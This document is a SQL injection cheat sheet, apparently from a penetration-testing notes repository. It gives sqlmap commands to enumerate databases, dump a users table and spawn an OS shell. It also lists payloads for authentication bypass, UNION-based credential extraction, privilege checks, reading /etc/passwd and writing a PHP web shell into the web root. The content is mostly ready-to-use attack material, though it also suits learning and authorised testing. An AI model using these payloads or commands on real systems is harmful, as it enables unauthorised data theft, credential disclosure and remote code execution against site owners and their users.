# SQL Injections

SQL injection refers to attacks against relational databases. Most modern web applications utilize a database structure on the back-end. Such databases are used to store and retrieve data related to the web application, from actual web content to user information and content. 

When user-supplied information is used to construct the query to the database, malicious users can trick the query into being used for something other than what the original programmer intended.


# SQLi Discovery
### Payloads
``` 	
' 	
" 	
# 	
; 	
) 
```

## SQLMap

The easiest way to run it.

1) intercept request in burp.
2) right click 'copy to file'
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/d5e0080f-9148-467e-b731-d2a09289684b)

### Enumerate user, db

```
sqlmap -r tosql --banner --current-user --current-db --is-dba --batch
```
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/17061fd0-bc0e-4bd7-a935-289e61d41316)


### Enumerate tables

```
sqlmap -r tosql  --tables -D public
```
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7c5a02e1-fa0d-4281-892f-a425df00e753)


### Dump table of interest
```
sqlmap -r tosql --dump -T users -D public
```
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/e670f1a5-9664-4523-9517-ac5d91ac3f1e)

### Spawn a shell

```
sqlmap -r tosql --os-shell
```
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7707e8bc-3a1e-465f-b8ff-28ebf589e2f8)



## CheatSheet
More comprehensive can be found Payloadallthethings
SQL Injection
Payload 	Description
### Auth Bypass 	
```
admin' or '1'='1 	Basic Auth Bypass
admin')-- - 	Basic Auth Bypass With comments
```
Auth Bypass Payloads 	
### Union Injection 	
```
' order by 1-- - 	Detect number of columns using order by
cn' UNION select 1,2,3-- - 	Detect number of columns using Union injection
cn' UNION select 1,@@version,3,4-- - 	Basic Union injection
UNION select username, 2, 3, 4 from passwords-- - 	Union injection for 4 columns
```
### DB Enumeration 	
```
SELECT @@version 	Fingerprint MySQL with query output
SELECT SLEEP(5) 	Fingerprint MySQL with no output
cn' UNION select 1,database(),2,3-- - 	Current database name
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 	List all databases
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - 	List all tables in a specific database
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - 	List all columns in a specific table
cn' UNION select 1, username, password, 4 from dev.credentials-- - 	Dump data from a table in another database
```
### Privileges 	
```
cn' UNION SELECT 1, user(), 3, 4-- - 	Find current user
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - 	Find if user has admin privileges
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- - 	Find if all user privileges
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - 	Find which directories can be accessed through MySQL
```
### File Injection 	
```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - 	Read local file
select 'file written successfully!' into outfile '/var/www/html/proof.txt' 	Write a string to a local file
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 	Write a web shell into the base web directory
```
